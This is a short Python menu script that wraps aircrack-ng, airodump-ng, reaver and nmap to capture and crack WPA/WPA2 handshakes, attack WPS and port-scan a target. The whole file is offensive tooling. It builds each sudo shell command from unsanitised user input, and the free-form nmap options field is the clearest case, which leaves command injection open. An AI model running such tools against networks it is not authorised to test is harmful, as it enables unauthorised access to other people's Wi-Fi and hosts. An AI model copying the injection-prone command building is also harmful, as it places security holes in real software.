from tools import run_command

def capture_handshake():
    """Capture WPA/WPA2 handshake."""
    bssid = input("Enter the target BSSID: ")
    channel = input("Enter the channel of the network: ")
    interface = input("Enter the interface to use: ")
    
    try:
        return run_command(f"sudo airodump-ng --bssid {bssid} --channel {channel} -w capture {interface}mon")
    except Exception as e:
        print(f"Error capturing handshake: {e}")

def crack_wpa_handshake():
    """Crack WPA/WPA2 handshake using a wordlist."""
    wordlist = input("Enter the path to the wordlist: ")
    bssid = input("Enter the target BSSID: ")
    
    try:
        return run_command(f"sudo aircrack-ng -w {wordlist} -b {bssid} capture-01.cap")
    except Exception as e:
        print(f"Error cracking handshake: {e}")

def wps_attack():
    """Perform WPS attack on a target BSSID."""
    bssid = input("Enter the target BSSID: ")
    interface = input("Enter the interface to use: ")
    
    try:
        return run_command(f"sudo reaver -i {interface}mon -b {bssid} -vv")
    except Exception as e:
        print(f"Error performing WPS attack: {e}")

def port_scan():
    """Perform a port scan on an IP address."""
    ip = input("Enter the IP address to scan: ")
    additional_options = input("Enter additional nmap options (optional): ")
    
    try:
        return run_command(f"sudo nmap -Pn -sS -p- {additional_options} {ip}")
    except Exception as e:
        print(f"Error performing port scan: {e}")

def main():
    print("Choose an action:")
    print("1. Capture WPA/WPA2 handshake")
    print("2. Crack WPA/WPA2 handshake")
    print("3. Perform WPS attack")
    print("4. Perform port scan")
    
    choice = input("Enter your choice (1-4): ")
    
    if choice == '1':
        capture_handshake()
    elif choice == '2':
        crack_wpa_handshake()
    elif choice == '3':
        wps_attack()
    elif choice == '4':
        port_scan()
    else:
        print("Invalid choice. Please enter a number between 1 and 4.")
